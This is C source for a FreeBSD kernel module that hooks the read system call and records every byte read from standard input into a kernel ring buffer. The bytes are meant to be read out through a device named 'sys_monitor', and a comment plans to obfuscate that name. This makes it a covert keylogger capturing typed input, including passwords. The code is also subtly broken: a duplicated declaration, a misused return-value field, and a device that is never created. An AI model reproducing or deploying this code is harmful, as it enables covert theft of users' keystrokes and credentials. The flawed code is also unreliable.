#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/kernel.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/conf.h>
#include <sys/uio.h>

#define RING_SIZE 2048
static char ring_buffer[RING_SIZE];
static unsigned int head = 0;
static unsigned int tail = 0;
static struct mtx ring_mtx;

static sy_call_t *old_read = NULL;
static struct cdev *monitor_dev = NULL;

/* Character Device Prototypes */
static d_open_t monitor_open;
static d_read_t monitor_read;

static struct cdevsw monitor_cdevsw = {
    .d_version = D_VERSION,
    .d_open    = monitor_open,
    .d_read    = monitor_read,
    .d_name    = "sys_monitor",
};

static int monitor_open(struct cdev *dev, int oflags, int devtype, struct thread *td) {
    return (0);
}

/* Invoked whenever a userspace utility reads from /dev/sys_monitor . Will need to obfuscate this. */
static int monitor_read(struct cdev *dev, struct uio *uio, int ioflag) {
    int error = 0;
    char byte_to_send;

    mtx_lock(&ring_mtx);

    /* Drain the ring buffer byte-by-byte and push to userspace */
    while (tail != head && uio->uio_resid > 0) {
        byte_to_send = ring_buffer[tail];
        tail = (tail + 1) % RING_SIZE;

        /* Temporarily drop the lock during memory translation to prevent deadlocks */
        mtx_unlock(&ring_mtx);
        error = uiomove(&byte_to_send, 1, uio);
        mtx_lock(&ring_mtx);

        if (error != 0)
            break;
    }

    mtx_unlock(&ring_mtx);
    return (error);
}

static sy_call_t *old_read = NULL;

static int 
read_hook(struct thread *td, void *syscall_args) 
{
    struct read_args *uap = (struct read_args *)syscall_args;
    int error;

    error = read(td, syscall_args);

    if (error || (uap->nbyte == 0) || (uap->fd != 0)) {
        return (error);
    }

    size_t actual_bytes = td->td_retval;
    if (actual_bytes == 0) {
        return (error);
    }

    // Extracting userspace bytes into ring buffer
    char single_byte;
    for (size_t i = 0; i < actual_bytes; i++) {
        if (copyin((const char *)uap->buf + i, &single_byte, 1) == 0) {
            
            // lock before updating shared indexing boundaries
            mtx_lock(&ring_mtx);
            
            // Ensure the circular queue is not completely saturated
            if (((head + 1) % RING_SIZE) != tail) {
                ring_buffer[head] = single_byte;
                head = (head + 1) % RING_SIZE;
            }
            
            mtx_unlock(&ring_mtx);
        } else {
            break;
        }
    }

    return (error);
}


// Load/unload event handler.
static int 
load(struct module *module, int cmd, void *arg) 
{
    int error = 0;

    switch (cmd) {
    case MOD_LOAD:
        // Initialize the ring buffer protection mutex
        mtx_init(&ring_mtx, "ring_buffer_lock", NULL, MTX_DEF);
        old_read = sysent[SYS_read].sy_call;
        sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
        break;
    case MOD_UNLOAD:
        sysent[SYS_read].sy_call = old_read;
        mtx_destroy(&ring_mtx);
        break;
    default:
        error = EOPNOTSUPP;
        break;
    }
    return (error);
}

static moduledata_t read_hook_mod = {
    "read_hook",    /* module name */
    load,           /* event handler */
    NULL            /* extra data */
};

DECLARE_MODULE(read_hook, read_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);